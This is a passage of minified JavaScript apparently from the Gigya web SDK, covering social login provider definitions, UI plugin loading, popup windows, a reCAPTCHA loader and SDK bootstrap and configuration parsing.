        c && (c = c.toLowerCase()), c === o[r] && e.splice(a, 1);
      }
      return e;
    }
    function l(e, t) {
      null == t && (t = []);
      for (var n = [], i = 0; i < e.length; i++) {
        for (var o = e[i], r = !0, a = 0; a < t.length; a++) {
          for (var s = !1, c = 0; c < o.arDefaultCapabilities.length; c++) if (o.arDefaultCapabilities[c].toLowerCase() == t[a].toLowerCase()) {
            s = !0;
            break;
          }
          if (!s) {
            r = !1;
            break;
          }
        }
        r && n.push(o);
      }
      return n;
    }
    function d() {
      return t.arProviders.concat();
    }
    function g(e, n) {
      void 0 === n && (n = t.arProviders);
      var o = ("" + (e = s(e = ("" + e).split(" ").join("").split(".").join("").toLowerCase()))).split(",");
      o = f(o, n);
      for (var r = [], c = 0; c < o.length; c++) {
        var u = a(o[c], n);
        null != u && -1 == i.indexOf(r, u) && r.push(u);
      }
      return r;
    }
    function f(e, n) {
      n || (n = t.arProviders);
      for (var i = [], o = 0; o < e.length; o++) if ("*" == e[o]) for (var r = 0; r < n.length; r++) {
        for (var a = !1, s = 0; s < e.length; s++) e[s].toLowerCase() === n[r].name.toLowerCase() && (a = !0);
        a || n[r].explicitOnly || i.push(n[r].name);
      } else i.push(e[o]);
      return i;
    }
    t.Provider = r, t.arProviders = [new r(64, "Facebook", 650, 400, "login,friends,places,status,actions,photos"), new r(9012, "Twitter", 800, 440, "login,friends,notifications,actions,status,places,checkins"), new r(72, "Google+", 560, 600, "login,contacts", !1, "google|googleplus"), new r(9042, "LinkedIn", 865, 450, "login,friends,status,actions,notifications,contacts"), new r(9058, "Amazon", 785, 510, "login"), new r(9803, "Yahoo", 500, 567, "login,friends,contacts,notifications"), new r(1047, "Messenger", 380, 540, "login, friends", !1, "messenger|microsoft"), new r(9222, "Odnoklassniki", 888, 425, "login"), new r(9007, "FourSquare", 1e3, 650, "login,friends,places,checkins"), new r(8191, "Renren", 450, 350, "login,friends,status,actions"), new r(8203, "QQ", 570, 460, "login,actions"), new r(9821, "Sina", 640, 380, "login,status,actions"), new r(4228, "Mixi", 1e3, 720, "login,friends,actions,photos", !0), new r(9830, "Yahoo! JAPAN", 980, 700, "login", !0), new r(8205, "Spiceworks", 640, 380, "login", !0), new r(9041, "VKontakte", 610, 510, "login,friends,photos,status,actions"), new r(4096, "WordPress", 700, 540, "login"), new r(256, "Blogger", 760, 400, "login"), new r(4218, "Netlog", 730, 590, "login", !0), new r(5002, "Livedoor", 970, 700, "login", !0), new r(5004, "Fox News", 730, 590, "login", !0), new r(1051, "PayPal", 400, 550, "login", !0), new r(9219, "Xing", 785, 510, "login,friends", !0), new r(8206, "WeChat", 730, 590, "login", !1, "wechat|weixin"), new r(4121, "Custom OpenID", 730, 590, "login", !0), new r(4122, "Custom SAML", 730, 590, "login", !0), new r(10001, "OpenID Connect", 730, 590, "login", !0), new r(6002, "Site", 730, 590, "", !0), new r(1052, "PayPalOAuth", 730, 590, "login", !0), new r(8207, "Line", 730, 590, "login"), new r(20001, "Kakao", 500, 600, "login", !0), new r(20002, "Naver", 780, 555, "login", !0), new r(20003, "DocCheck", 874, 844, "login", !0), new r(20004, "Apple", 874, 844, "login", !0)], t.getProviderByName = a, t.replaceProviderAliases = s, t.getProviderById = c, t.hideProvidersByName = u, t.getProvidersForRequiredCapabilities = l, t.getAllProviders = d, t.getProvidersByName = g, t.replaceWildcard = f, o.createAlias("gigya.socialize.getAllProviders", d), o.createAlias("gigya.socialize.replaceProviderAliases", s), o.createAlias("gigya.socialize.getProvidersByName", g), o.createAlias("gigya.socialize._getProviderByName", a), o.createAlias("gigya.socialize.hideProvidersByName", u), o.createAlias("gigya.socialize._getProviderByID", c), o.createAlias("gigya.socialize.getProvidersForRequiredCapabilities", l);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(95),
      r = n(148),
      a = n(9),
      s = n(4),
      c = n(45),
      u = n(149),
      l = n(18),
      d = n(17),
      g = n(32),
      f = n(112),
      p = n(21),
      h = n(35),
      v = n(59),
      y = n(146),
      w = n(13);
    t.__pluginsCoreLoaded = !1;
    var m = {
        showReactionsBarUI: ["barID"],
        showCommentsUI: ["categoryID", "streamID"]
      },
      _ = function (e) {
        function n(t, i, o, r, a, s) {
          void 0 === o && (o = {}), void 0 === r && (r = {}), void 0 === a && (a = ""), void 0 === s && (s = {});
          var c = e.call(this, n.getApiName(i, t, s), s) || this;
          return c.methodName = t, c.jsName = i, c.settings = s, s.defaultParams = o || {}, s.defaultPopupParams = r || {}, s.requiredParams = a || "", c;
        }
        return i.__extends(n, e), n.getApiName = function (e, t, n) {
          return void 0 === n && (n = {}), n.apiName || e.split(".")[0] + "." + t;
        }, n.versionSelector = function (e, t, n, i, o) {
          void 0 === o && (o = "version");
          var c = new r.VersionSelector(e, i, n);
          return a.createAlias("gigya." + t + "." + e, function () {
            for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
            var n = e[0],
              i = e[1];
            i || (i = n, n = null), i || (i = {}, e.push(i));
            var r = s.merge([{}, n, i]);
            c.callVersion("" + r[o], i, e);
          }), c;
        }, n.createApi = function (e, t, i, o, r, a) {
          void 0 === r && (r = {}), r.useBasePlugin = !0;
          var s = new n(e, o, null, null, null, r);
          return s.namespace = t, s.className = i, s.instanceMethods = a || [], s.addInstanceMethodsAliases(), s;
        }, n.prototype.addInstanceMethodsAliases = function () {
          for (var e = 0; e < this.instanceMethods.length; e++) this.createInstanceMethodAlias(this.instanceMethods[e]);
        }, n.prototype.createInstanceMethodAlias = function (e) {
          var t = this;
          a.createAlias("gigya." + this.namespace + "." + e, function (n) {
            if (t.injectionInfo) {
              var i = t.getPublicMethod(e),
                o = u.getPluginInstance(n, t.injectionInfo);
              if (o) {
                var r = [];
                l.forEach(i.argNames, function (e) {
                  e && void 0 !== n[e] && r.push(n[e]);
                }), o[i.instanceMethod].apply(o, r);
              } else c.addLog("couldn't find instance", t, !1);
            } else c.addLog("invalid injection info", t, !1);
          });
        }, n.prototype.getPublicMethod = function (e) {
          var t;
          if (this.injectionInfo.publicMethods && (t = this.injectionInfo.publicMethods[e]), !t) throw new Error("public method " + e + " is not configured for " + this.injectionInfo.name);
          return t;
        }, n.prototype.preprocessRequest = function (t, n) {
          var i = this;
          e.prototype.preprocessRequest.call(this, t, function () {
            t.source || i.setSourceData(t), n && n();
          });
        }, n.prototype.run = function (e, t) {
          var n = this;
          if (this.settings.silentMode) {
            window.gigya.logger.warn("Deprecated Feature: " + this.methodName);
            var i = e.callback;
            "function" == typeof i && i();
          } else !this.settings.waitForAPIQueue || e.ignoreApiQueue ? this.startUI(e, t) : d.queueForExecution("API", function () {
            n.startUI(e, t);
          });
        }, n.prototype.startUI = function (e, t) {
          var n = this;
          e = s.clone(e), this.prepareParameters(e), this.preprocessRequest(e, function () {
            n.settings.useBasePlugin ? (window.gigya.logger.info("loading modern plugin"), n.loadPluginJS(e, t, function (i) {
              d.queueForExecution("UI", function () {
                i && n.className && (n.pluginType = n.getPluginType(), n.injectionInfo = n.pluginType.injectionInfo(n));
                var o = function () {
                  n.startPlugin(e, t);
                };
                0 == e.waitForDebug ? o() : d.queueForExecution("debug", o);
              });
            })) : (window.gigya.logger.info("loading legacy plugin"), n.legacyStartUI(e, t));
          });
        }, n.prototype.startPlugin = function (e, t) {
          var n = this;
          g.dispatch({
            eventName: "beforePluginRequest",
            methodName: this.methodName,
            params: e,
            explicitParams: t
          }, e);
          var i = e.originalMethodName || this.methodName;
          if (c.logCall(i, e), f.reportLoad(i, e), this.pluginType) {
            if (e) {
              var o = u.getPluginInstance(e, this.injectionInfo);
              o && o.dispose && !e._allowMultipleInstances && !e.newModal && o.dispose();
            }
            var r = new this.pluginType(e, t, this.injectionInfo);
            if (u.setPluginInstance(e, this.injectionInfo, r), r.onDisposedEvent().add(function () {
              return u.removePluginInstance(e, n.injectionInfo);
            }), window.gigya.logger.info("starting plugin " + this.injectionInfo.name + " with params", r.params), r.start(), r.containerID) {
              var s = document.getElementById(r.containerID);
              s && (s.gigyaPluginInstance = r);
            }
            e.getInstance && e.getInstance(r);
          } else a.callFunction("gigya." + this.jsName + "." + this.methodName, [e, e, e]);
        }, n.prototype.loadPluginJS = function (e, n, i) {
          if (this.wasPluginJSLoaded(e)) window.gigya.logger.info("plugin was already loaded"), i && i(!1);else {
            var o = !1,
              r = p.getCdnResource("/js/"),
              a = "gigya.services." + this.jsName,
              s = (e.lang ? "lang=" + e.lang : "") + "&version=" + window.gigya.build.version,
              c = r + a + ".min.js?" + s,
              u = r + "gigya.services.plugins.base.min.js?services=" + a + "&" + s,
              l = void 0;
            t.__pluginsCoreLoaded ? l = c : (window.gigya.logger.debug("locking queue to fetch basePlugin"), l = u, t.__pluginsCoreLoaded = !0, o = !0, d.hold("pluginsJS", "UI")), window.gigya.logger.info("loading " + a), g.dispatch({
              eventName: "beforePluginLoad",
              methodName: this.methodName,
              explicitParams: n,
              params: e
            }, e), h.load(l, null, function () {
              o && d.release("pluginsJS", "UI"), i && i(!0);
            }, !0, void 0, [c, u]);
          }
        }, n.prototype.wasPluginJSLoaded = function (e) {
          this.jsName, this.methodName;
          var t = "gigya.services." + this.jsName + ".js";
          try {
            var n = this.getPluginType(),
              i = window.gigya.i18n[t][e.lang];
          } catch (e) {
            return !1;
          }
          return void 0 !== n && void 0 !== i;
        }, n.prototype.getPluginType = function () {
          for (var e = s.expressionHelper(window.gigya), t = 0, n = ["_.plugins." + this.className, this.jsName + "." + this.methodName]; t < n.length; t++) {
            var i = n[t],
              o = e.getField(i);
            if (o) return o;
          }
        }, n.prototype.setSourceData = function (e) {
          if ("socialize.showSimpleShareUI" == this.methodName ? e.source = "socialize.showShareUI" : e.source = e.originalMethodName || this.methodName, !e.sourceData && m[this.methodName]) {
            for (var t, n = {}, i = 0; i < m[this.methodName].length; i++) {
              var o = m[this.methodName][i];
              null != e[o] && (t = !0, n[o] = e[o]);
            }
            t && (e.sourceData = n);
          }
          e.pluginsStack || (e.pluginsStack = []), e.pluginsStack.push({
            source: this.methodName
          }), e.lastSource = this.methodName;
        }, n.prototype.validateRequiredParams = function (e) {
          for (var t = this.settings.requiredParams.split("|"), n = 0; n < t.length; n++) {
            var i = t[n];
            if ("" != i && (null == e[i] || "" == e[i])) return v.dispatchInvalidParamError(e, i), !1;
          }
          return !0;
        }, n.prototype.setDefaultParams = function (e) {
          var t = !e.containerID || e.isPopup;
          for (var n in this.settings.defaultParams) null == e[n] && (t && this.settings.defaultPopupParams[n] ? e[n] = this.settings.defaultPopupParams[n] : e[n] = this.settings.defaultParams[n]);
          if (t) for (var n in this.settings.defaultPopupParams) e[n] || (e[n] = this.settings.defaultParams[n]);
        }, n.prototype.prepareParameters = function (e) {
          for (var t in e) -1 != t.toLowerCase().indexOf("provider") && "string" == typeof e[t] && (e[t] = y.replaceProviderAliases(e[t]));
          e.lang || (e.lang = window.gigya.thisScript.lang.langCode), e.source ? e.isPopup = !1 : this.setSourceData(e);
        }, n.prototype.legacyStartUI = function (e, t) {
          var n = this,
            i = e.containerID;
          if (this.settings.ignoreContainerId) e.containerID = "", i = "";else if (null == e.containerID && !this.settings.allowPopup || e.containerID && !document.getElementById(e.containerID)) return void v.dispatchInvalidParamError(e, "containerID");
          var o = this.settings.allowPopup && (!i || e.isPopup);
          o && this.settings.useNewModal && (e.useNewModal = !0), this.setDefaultParams(e), this.settings.allowPopup || o || w.clearByID(i), this.validateRequiredParams(e) && this.loadPluginJS(e, t, function () {
            var i = function () {
              n.prepareContainer(e, o, function () {
                n.startPlugin(e, t);
              });
            };
            d.queueForExecution("UI", function () {
              0 == e.waitForDebug ? i() : d.queueForExecution("debug", i);
            });
          });
        }, n.prototype.prepareContainer = function (e, t, n) {
          var i = this;
          if (document.body) {
            var o,
              r = e.containerID;
            if (t && (r = w.getCenteredDivID(this.methodName), e.newModal && (r += new Date().getTime()), e.containerID = r, e.isPopup = !0, document.getElementById(r) || ((o = w.createTopLevelDiv(r)).style.position = "absolute")), !(o = o || document.getElementById(r))) return v.dispatchInvalidParamError(e, "containerID"), void n();
            var a = o.Reqs ? o.Reqs : o.Reqs = [],
              s = a.length + "@0@" + r;
            e.rid = s;
            a[a.length] = {
              rid: s,
              container: o,
              method: this.methodName,
              context: e.context,
              c: e,
              p: e,
              i: e,
              operation: this.methodName,
              isHTML: !0
            };
            if (o && o.style) {
              o.style.display = "", o.style.visibility = "";
              var c = document.getElementById("gigya_ifr_" + r);
              c && (c.style.display = "", c.style.visibility = "");
              null != c && (w.setSize(c, e.width, e.height, t), c.style.visibility = "visible"), w.setSize(o, e.width, e.height, t);
            }
            var u = this.methodName.split(".").pop();
            o.setAttribute && o.setAttribute("gigid", (e.source && e.source != u ? e.source + "_" : "") + u), n();
          } else window.setTimeout(function () {
            i.prepareContainer(e, t, n);
          }, 200);
        }, n;
      }(o.BaseApi);
    t.UiApi = _;
  }, function (module, exports, __webpack_require__) {
    Object.defineProperty(exports, "__esModule", {
      value: !0
    });
    var arrayUtils = __webpack_require__(18),
      VersionSelector = function () {
        function VersionSelector(e, t, n) {
          if (this.methodName = e, this._versions = t, !this._versions || this._versions.length < 1) throw new Error(this.methodName + ": required at least one valid version");
          if (n) {
            if (this._defaultVersionIndex = this.findVersionIndexOrDefault(n), -1 == this._defaultVersionIndex) throw new Error(this.methodName + ": default version is not defined as a version");
          } else this._defaultVersionIndex = 0;
        }
        return VersionSelector.prototype.callVersion = function (e, t, n) {
          void 0 === t && (t = {}), void 0 === n && (n = [t]);
          var i = this.findVersionIndexOrDefault(e);
          if (-1 == i) throw Error("gigya plugin version doesn't exist");
          var o = this.findSupportedVersion(i);
          if (!o) throw new Error(e + ": could not find supported version for this browser");
          this.invokeVersionMethod(o, t, n);
        }, VersionSelector.prototype.findSupportedVersion = function (e) {
          for (var t = this._versions.length, n = 0; n < t; ++n) {
            var i = this._versions[(e - n + t) % t];
            if (!i.isSupported || i.isSupported({
              directCall: 0 == n
            })) return i;
          }
        }, VersionSelector.prototype.findVersionIndexOrDefault = function (e) {
          var t = -1;
          return e && (t = arrayUtils.firstIndex(this._versions, function (t) {
            return t.versionName == e;
          })), -1 == t && (t = void 0 !== this._defaultVersionIndex ? this._defaultVersionIndex : -1), t;
        }, VersionSelector.prototype.invokeVersionMethod = function (version, params, args) {
          var versionMethod;
          switch (void 0 === params && (params = {}), void 0 === args && (args = [params]), typeof version.method) {
            case "function":
              versionMethod = version.method;
              break;
            case "string":
              versionMethod = eval(version.method), params.selectedMethodName = version.method;
              break;
            default:
              throw Error(this.methodName + " " + version.versionName + ": unsupported gigya-version method");
          }
          for (var field in version.additionalParams) params[field] = version.additionalParams[field];
          params.originalMethodName = this.methodName, versionMethod.apply(this, args);
        }, VersionSelector;
      }();
    exports.VersionSelector = VersionSelector;
  }, function (e, t) {
    function n(e, t) {
      return e.instanceID ? e.instanceID : e.isPopup ? "gigya-modal-plugin-container-" + t.methodName : e.containerID ? e.containerID : t.name;
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.instances = {}, t.getPluginInstance = function (e, i) {
      var o = n(e, i);
      return t.instances[o];
    }, t.setPluginInstance = function (e, i, o, r) {
      void 0 === r && (r = !1);
      var a = n(e, i);
      if (!r) for (var s = a, c = 2; t.instances[a]; c++) a = s + c.toString();
      e.instanceID = a, t.instances[a] = o;
    }, t.removePluginInstance = function (e, i) {
      delete t.instances[n(e, i)], delete e.instanceID;
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
      function e(e) {
        void 0 === e && (e = []), this._handlers = e;
      }
      return e.prototype.add = function (e) {
        this._handlers.push(e);
      }, e.prototype.remove = function (e) {
        var t = this._handlers.indexOf(e);
        t > -1 && this._handlers.splice(t, 1);
      }, e;
    }();
    t.EventWrapper = n;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.getMetaTag = function (e) {
      for (var t = document.getElementsByTagName("meta"), n = 0; n < t.length; n++) if (t[n].getAttribute("property") == e && t[n].getAttribute("content")) return t[n].getAttribute("content");
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(3),
      o = n(10),
      r = n(49),
      a = n(32);
    function s(e, t, n, i) {
      var o;
      return "string" == typeof e ? (o = parseInt(e), -1 !== e.indexOf("%") && (o = .01 * parseInt(e) * t, i && (o -= i / 2))) : o = e, o = Math.round(o), isNaN(o) && void 0 !== n && (o = s(n, t, void 0, i)), o;
    }
    t._openedWindows = {}, t._uniqueWindowCounter = 0, t._calcPixels = s, t.open = function (e, n, c) {
      c || (c = {
        menubar: 0,
        toolbar: 0,
        resizable: 1,
        scrollbars: 1
      }), c.width = s(c.width, screen.width, 960), c.height = s(c.height, screen.height, 680), c.left = s(c.left, screen.width, "50%", c.width), c.top = s(c.top, screen.height, "50%", c.height);
      var u = "";
      for (var l in c) u += "," + l + "=" + c[l];
      u = u.substr(1);
      var d = i.localInfo.isIE && e.length > 2048 || e.length > 4096,
        g = e;
      d && (g = "", i.localInfo.isIE && (g = "about:blank")), n || (n = "_gigWindow_" + new Date().getTime() + "_" + ++t._uniqueWindowCounter);
      var f = window.open(g, n, u);
      f && f.focus && f.focus(), t._openedWindows[n] = f;
      var p = o.getParamsFromURL(e);
      return d && r.redirect(e.split("?")[0], [p], "POST", n), a.dispatch({
        eventName: "windowOpened",
        url: e,
        params: p
      }), null != t._openedWindows[n];
    }, t.close = function (e) {
      if (null != t._openedWindows[e]) {
        var n = function () {
          try {
            null != t._openedWindows[e] && t._openedWindows[e].close(), delete t._openedWindows[e];
          } catch (e) {}
        };
        i.localInfo.iosVersion >= 6 ? n() : window.setTimeout(n, 10);
      }
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.now = function () {
      return Date.now();
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = function (e) {
        function t() {
          return null !== e && e.apply(this, arguments) || this;
        }
        return i.__extends(t, e), t.prototype.run = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (e) {
              switch (e.label) {
                case 0:
                  return [4, this.next("/runtime/v1/workflowDefinitions/" + this.flow.workflowDefinitionId + "/dispatch")];
                case 1:
                  return e.sent(), [2];
              }
            });
          });
        }, t;
      }(n(117).BaseActivity);
    t.InitActivity = o;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), function (e) {
      e.Event = "Event", e.ScreenSet = "ScreenSet";
    }(t.ActivityType || (t.ActivityType = {}));
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = window,
      i = function () {
        function e() {}
        return e.prototype.forceReset = function () {
          e.greCaptchaLoad = void 0;
        }, e.prototype.getInstance = function (e) {
          return (null == e ? void 0 : e.isEnterprise) ? grecaptcha.enterprise : grecaptcha;
        }, e.prototype.load = function (t) {
          var i,
            o = this;
          return "undefined" != typeof grecaptcha || e.greCaptchaLoad || (e.greCaptchaLoad = new gigya.Promise(function (r, a) {
            var s = function () {
                var e,
                  n = null === (e = o.getInstance(t)) || void 0 === e ? void 0 : e.ready;
                "undefined" != typeof grecaptcha && n ? n(r) : r();
              },
              c = function () {
                return clearTimeout(i), window.gigya.logger.debug("Loading google captcha from " + e.RECAPTCHA_DOMAIN), "undefined" != typeof grecaptcha ? (window.gigya.logger.debug("Aborting. Google captcha already loaded"), s()) : t.googleCaptchaDomain === e.RECAPTCHA_DOMAIN ? (window.gigya.logger.debug("Aborting. Already tried to load from " + e.RECAPTCHA_DOMAIN + " and failed'"), a("Failed to load google's captcha from " + e.RECAPTCHA_DOMAIN)) : (t.googleCaptchaDomain = e.RECAPTCHA_DOMAIN, void window.gigya.utils.script.load(o.providerURL(t), a, s));
              };
            return i = setTimeout(c, e.RETRY_FROM_RECAPTCHA_TIMEOUT), t.callbackID && (n[t.callbackID] = function () {
              delete n[t.callbackID], "undefined" != typeof grecaptcha ? s() : a("Error while trying to load grecaptcha");
            }), window.gigya.logger.debug("Loading grecaptcha from " + o._domain(t)), window.gigya.utils.script.load(o.providerURL(t), c, s);
          })), e.greCaptchaLoad;
        }, e.prototype.providerURL = function (e) {
          var t = "api";
          return (null == e ? void 0 : e.isEnterprise) && (t = "enterprise"), "//" + this._domain(e) + "/recaptcha/" + t + ".js?" + this.loadQueryParams(e);
        }, e.prototype.loadQueryParams = function (t) {
          var n = "";
          return n = t.type == e.V3_CAPTCHA_TYPE || t.type == e.ENTERPRISE_CAPTCHA_TYPE ? "render=" + t.siteKey : "render=explicit", t.callbackID && (n += "&onload=" + t.callbackID), t.lang && (n += "&hl=" + t.lang), n;
        }, e.prototype._domain = function (t) {
          var n = 0 === window.gigya.dataCenter.toLowerCase().indexOf("cn1");
          return t.googleCaptchaDomain || (n ? e.RECAPTCHA_DOMAIN : e.GOOGLE_DOMAIN);
        }, e.V3_CAPTCHA_TYPE = "reCaptchaV3", e.ENTERPRISE_CAPTCHA_TYPE = "reCaptchaEnterpriseScore", e.RECAPTCHA_DOMAIN = "www.recaptcha.net", e.GOOGLE_DOMAIN = "www.google.com", e.RETRY_FROM_RECAPTCHA_TIMEOUT = 3e3, e;
      }();
    t.GoogleReCaptchaLoader = i, t.default = new i();
  }, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(0),
        o = n(17),
        r = n(59),
        a = n(9),
        s = n(35),
        c = n(21),
        u = n(62),
        l = n(10),
        d = n(5),
        g = n(4),
        f = n(96),
        p = n(113),
        h = n(27),
        v = n(3),
        y = n(63),
        w = n(120),
        m = n(2);
      function _() {}
      function b() {
        if (window.gigya.abTesting) for (var e in window.gigya.abTesting) if ("optimizely" === e) {
          var t = window.gigya.abTesting[e];
          if (t.serviceParams && t.serviceParams.hasOwnProperty("apiKey")) {
            var n = window.location.pathname,
              i = !1;
            if (t.disabledPaths) for (var o = 0; o < t.disabledPaths.length; o++) if (t.disabledPaths[o].indexOf(n) > -1) {
              i = !0;
              break;
            }
            if (!i) for (o = 0; o < t.enabledPaths.length; o++) n.indexOf(t.enabledPaths[o]) > -1 && s.load("//cdn.optimizely.com/js/" + t.serviceParams.apiKey + ".js");
          }
        }
      }
      function S(e) {
        v.localInfo.isNativeMobileApp || "1" != window.gigya._.apiAdapter.getStorage().getItem("gig_debug") ? e() : window.gigya.socialize.showDebugUI({
          ignoreApiQueue: !0,
          waitForDebug: !1,
          onLoad: e
        });
      }
      function P() {
        a.invokeOnPageLoad(function () {
          void 0 !== window.gigya_omniture_conf && s.load(c.getCdnResource("/js/GenesisExchange_Gigya.min.js"));
        });
      }
      t.parseScriptRetries = 0, t.init = function () {
        var t = this;
        window.gigya.logger.group("websdk root"), window.gigya.logger.info("partner settings:", window.gigya.partnerSettings), window.gigya.logger.info("local info:", v.localInfo);
        var n = window.gigya.logger.group("bootstrap websdk");
        o.hold("bootstrap", "API"), (v.localInfo.isIE6 || v.localInfo.isIE7 || v.localInfo.isIE8 || v.localInfo.isIE9 || v.localInfo.isIE10) && "undefined" != typeof console && void 0 !== console.log && console.log("Gigya: It looks like you're using an old version of Internet Explorer. This browser is not supported. Please upgrade to a newer version of IE."), I(function (s) {
          return i.__awaiter(t, void 0, void 0, function () {
            var t, c, u, l, d, g, f;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return [4, y.getSdkConfig()];
                case 1:
                  return t = i.sent(), window.gigya._.config = {
                    flags: t.flags,
                    plugins: t.plugins,
                    api: t.api,
                    hostedPagesDomain: t.hostedPagesDomain,
                    toggles: {
                      linkAccountV2: null === (l = t.toggles) || void 0 === l ? void 0 : l.linkAccountV2,
                      httpStatusCodes: null === (d = t.toggles) || void 0 === d ? void 0 : d.httpStatusCodes
                    },
                    consent: {
                      hasLicense: null !== (g = t.hasConsentLicense) && void 0 !== g && g
                    }
                  }, s && function (t) {
                    e(window.gigya.thisScript.globalConf, t.plugins), m.FlagService.overrideAllChildContext && (e(window.gigya.partnerSettings.plugins, t.plugins), e(window.gigya.partnerSettings, t.captcha), window.gigya.partnerSettings.baseDomains = t.api.baseDomains.join(","));
                  }(t), (c = window.gigya.thisScript.globalConf.customEventMap) && (window.gigya.logger.info("adding custom event map"), r.addMap(c)), window.gigya.logger.group("init api adapter"), k(function () {
                    if (window.gigya.logger.groupEnd("init api adapter"), window.gigya.isReady = !0, "function" == typeof onGigyaServiceReady) {
                      window.gigya.logger.info("invoke local onGigyaServiceReady event");
                      try {
                        onGigyaServiceReady("socialize");
                      } catch (e) {
                        window.gigya.logger.warn("gigya: error while invoking onGigyaServiceReady", e);
                      }
                    }
                    if ("function" == typeof window.gigya.thisScript.globalConf.onGigyaServiceReady) {
                      window.gigya.logger.info("invoke globalconf's onGigyaServiceReady event");
                      try {
                        window.gigya.thisScript.globalConf.onGigyaServiceReady("socialize");
                      } catch (e) {
                        window.gigya.logger.warn("gigya: error while invoking onGigyaServiceReady injected from server", e);
                      }
                    }
                    x(function () {
                      o.release("bootstrap", "API"), v.localInfo.isNativeMobileApp || (O(), C(), a.invokeOnPageLoad(function () {
                        return window.setTimeout(window.gigya.socialize.trackReferrals, 1e3);
                      })), n.end();
                    });
                  }), P(), b(), u = {
                    sref: null === (f = document.referrer) || void 0 === f ? void 0 : f.substr(0, 1e3)
                  }, window.gigya.thisScript.globalConf.actionCounterPath && (u.actionCounterPath = window.gigya.thisScript.globalConf.actionCounterPath), [2];
              }
            });
          });
        });
      }, t.warnOnUnsupportedBrowser = _, t.loadABTesting = b, t.startDebugIfNeeded = S, t.loadOmniture = P;
      function A(e) {
        void 0 === e && (e = "en-US");
        var t,
          n,
          i = e.replace("en-US", "en"),
          o = (e = e.replace("_", "-").toLowerCase()).split("-"),
          r = o[0];
        switch (t = (t = o.length > 1 ? o[1] : r).toUpperCase(), e) {
          case "es-mx":
            n = e, t = "ES";
            break;
          case "pt-br":
          case "zh-cn":
          case "zh-hk":
          case "zh-tw":
          case "te-st":
          case "fr-inf":
          case "de-inf":
          case "es-inf":
          case "nl-inf":
          case "lt-lt":
          case "lv-lv":
          case "et-ee":
            n = e;
            break;
          default:
            n = r;
        }
        return {
          full: r + "-" + t,
          langCode: n,
          countryCode: t,
          originalLang: i
        };
      }
      function I(e) {
        return i.__awaiter(this, void 0, void 0, function () {
          var n, o, r, a, s, c, f, p;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return !(n = u.getGigyaScriptElement()) || window.__gig_hidescript ? [3, 3] : (window.gigya.logger.info("parsing gigya script"), o = l.getParamsFromURL(n.src, !0) || {}, r = d.deserialize(window.gigya.partnerSettings.siteGroupGlobalConf) || {}, a = d.deserialize(window.gigya.partnerSettings.globalConf, {}, {
                  siteGroupGlobalConf: r
                }) || {}, s = d.deserialize(n.innerHTML) || {}, c = window.__gigyaConf || {}, window.gigya.thisScript = {
                  scriptElement: n,
                  protocol: 0 === n.src.indexOf("https:") ? "https" : "http",
                  baseDomain: n.src.split("/")[2],
                  APIKey: o.apikey,
                  lang: A(o.lang || c.lang || s.lang || a.lang || r.lang),
                  globalConf: g.merge([window.gigya.partnerSettings.plugins || {}, r, a, s, c], !1),
                  URLParams: o
                }, window.gigya.thisScript.globalConf.lang = window.gigya.thisScript.lang.langCode, !window.gigya.thisScript.APIKey && "object" == typeof console && console.warn ? console.warn("**** WARNING - Loading socialize.js without an APIKey parameter is unsupported and may result in an unexpected behavior.  ****") : window.gigya.thisScript.globalConf.APIKey = window.gigya.thisScript.APIKey, f = !1, window.gigya.utils.URL.getParamsFromURL(document.location.href).gig_ssoToken ? [4, E()] : [3, 2]);
              case 1:
                (null == (p = i.sent()) ? void 0 : p.apiKey) && (window.gigya.logger.warn("APIKey changed. using APIKey: " + p.apiKey), window.gigya.apiKey = window.gigya.thisScript.APIKey = window.gigya.thisScript.globalConf.APIKey = p.apiKey, f = !0), w.setSsoContext(p), i.label = 2;
              case 2:
                return e(f), [3, 4];
              case 3:
                t.parseScriptRetries < 10 ? (t.parseScriptRetries++, window.setTimeout(function () {
                  I(e);
                }, 200)) : (window.gigya.thisScript = {
                  scriptElement: null,
                  protocol: v.localInfo.protocol,
                  baseDomain: "https://cdns.gigya.com",
                  APIKey: "",
                  lang: A(""),
                  globalConf: {},
                  URLParams: {}
                }, e(!1)), i.label = 4;
              case 4:
                return [2];
            }
          });
        });
      }
      function k(e) {
        var t = window.__gigAPIAdapterSettings,
          n = function (e) {
            void 0 === e && (e = window.__gigAPIAdapterSettings);
            var t;
            e && e.getAPIKey() === window.gigya.thisScript.APIKey && (t = e.getAdapterName());
            return t || "web";
          }(t);
        v.localInfo.isNativeMobileApp = "mobile" === n, window.gigya.logger.info("selecting api adapter: " + n), window.gigya._.apiAdapter = window.gigya._.apiAdapters[n].newApiAdapter(t), a.createAlias("gigya.auth.loginToken.getTokenParam", window.gigya._.apiAdapter.getTokenParam), S(function () {
          window.gigya._.apiAdapter.init(e, 3);
        });
      }
      function C() {
        window.gigya.thisScript.globalConf.autoLogin && (window.gigya.logger.info("triggering auto-login"), f.autoLogin(), p.autoLogin());
      }
      function x(e) {
        var t = l.getParamsFromURL(document.location.href);
        t.mode && "error" === t.mode ? (window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], t), e()) : t.errorCode && t.regToken ? (window.gigya.logger.info("returned from redirect with regToken (errorCode: " + t.errorCode + ")"), h.checkCompleteRegistration(t, window.gigya.thisScript.globalConf, "", function () {
          return e();
        })) : e();
      }
      function O() {
        o.queueForExecution("API", function () {
          a.invokeOnPageLoad(function () {
